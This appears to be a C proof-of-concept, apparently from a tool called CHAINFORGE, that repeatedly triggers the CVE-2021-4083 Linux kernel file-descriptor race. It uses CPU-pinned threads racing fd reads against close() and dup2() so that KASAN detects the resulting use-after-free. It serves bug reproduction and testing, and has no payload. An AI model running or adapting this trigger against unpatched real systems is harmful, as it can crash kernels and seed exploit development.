/*
 * CHAINFORGE KASAN crash-trigger for CVE-2021-4083 (CWE-362 race -> CWE-416 UAF, fs/file) — TUNED.
 * __fget()/get_file_rcu could return a struct file being freed by a concurrent close() (the fix
 * re-checks the fd). TUNING vs the naive version: (1) pin the fget-thread and the close-thread to
 * DIFFERENT physical CPUs (the race needs true cross-CPU concurrency, not just SMP scheduling);
 * (2) keep the SAME fd number hot with a tight close()+dup2() cycle so a struct file is constantly
 * freed under fget; (3) heavy same-size (struct file) slab churn to reuse the freed object so KASAN
 * sees the poison. No driver, no config. NOT an exploit.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define HOTFD 400              /* a fixed fd number both threads target */
static volatile int stop = 0;

static void pin(int cpu) {
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* The real CVE-2021-4083 window: __fget()/get_file_rcu grabs a ref to a struct file that a
 * concurrent close() is dropping to zero + freeing. To WIDEN the window the fget-thread must be
 * IN the syscall (holding the file*) when close() frees it. A read() on a pipe read-end whose
 * write-end is still open BLOCKS inside the syscall holding the file ref — perfect. The close-
 * thread then closes that same fd. Uses socketpair (both ends stay usable) for a reliable ref. */
static int cur_fd = -1;       /* the fd currently being raced (a socketpair end) */

/* fget-thread: enters read()/recvmsg() on cur_fd -> holds the struct file* across the blocking
 * syscall while close-thread frees it. */
static void *fget_thread(void *arg) {
    (void)arg;
    pin((long)arg);
    char buf[64];
    while (!stop) {
        int fd = cur_fd;
        if (fd >= 0) {
            recv(fd, buf, sizeof buf, MSG_DONTWAIT);  /* fget -> deref; races the free */
            read(fd, buf, sizeof buf);
        }
    }
    return NULL;
}

/* close-thread: repeatedly make a fresh socketpair at HOTFD, expose it as cur_fd, then close it
 * out from under the fget threads (drops the last ref -> frees struct file mid-fget). */
static void *close_thread(void *arg) {
    (void)arg;
    pin(2);
    while (!stop) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) continue;
        char b[8] = {0};
        send(sv[1], b, sizeof b, MSG_DONTWAIT);   /* queue data so recv/read enter + hold ref */
        dup2(sv[0], HOTFD);
        cur_fd = HOTFD;
        close(sv[0]);
        close(sv[1]);
        close(HOTFD);           /* free the struct file while fget threads hold it */
        cur_fd = -1;
    }
    return NULL;
}

/* churn-thread (CPU 3): reallocate struct file objects to reuse freed slab (surface the UAF). */
static void *churn_thread(void *arg) {
    (void)arg;
    pin(3);
    while (!stop) {
        int fds[32];
        for (int i = 0; i < 32; i++) fds[i] = open("/proc/self/stat", O_RDONLY);
        for (int i = 0; i < 32; i++) if (fds[i] >= 0) close(fds[i]);
    }
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    pthread_t g, c, h, g2;
    pthread_create(&g, NULL, fget_thread, (void *)0L);   /* fget on CPU 0 */
    pthread_create(&g2, NULL, fget_thread, (void *)1L);  /* fget on CPU 1 */
    pthread_create(&c, NULL, close_thread, NULL);        /* close on CPU 2 */
    pthread_create(&h, NULL, churn_thread, NULL);        /* churn on CPU 3 */
    /* run longer than the naive version — narrow window needs more attempts */
    for (int i = 0; i < 1200; i++) {
        usleep(10000);
        if ((i & 127) == 0) printf("[cf] fd-race (tuned, pinned) %d/1200\n", i);
    }
    stop = 1;
    pthread_join(g, NULL);
    pthread_join(g2, NULL);
    pthread_join(c, NULL);
    pthread_join(h, NULL);
    printf("[cf] done (no KASAN splat this run)\n");
    return 0;
}
